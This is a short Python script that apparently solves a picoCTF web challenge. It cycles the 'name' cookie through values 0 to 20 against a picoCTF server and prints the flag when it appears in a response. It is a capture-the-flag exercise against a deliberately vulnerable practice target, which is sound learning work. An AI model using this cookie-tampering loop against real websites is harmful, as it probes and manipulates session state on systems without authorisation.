import requests
import re

url = "http://mercury.picoctf.net:21485/check"

for i in range(21):
    cookies = {'name': '{}'.format(i)}
    r = requests.get(url, cookies=cookies)
    if 'picoCTF{' in r.text:
        flag = re.findall('picoCTF\{.*\}', r.text)[0]
        print(flag)
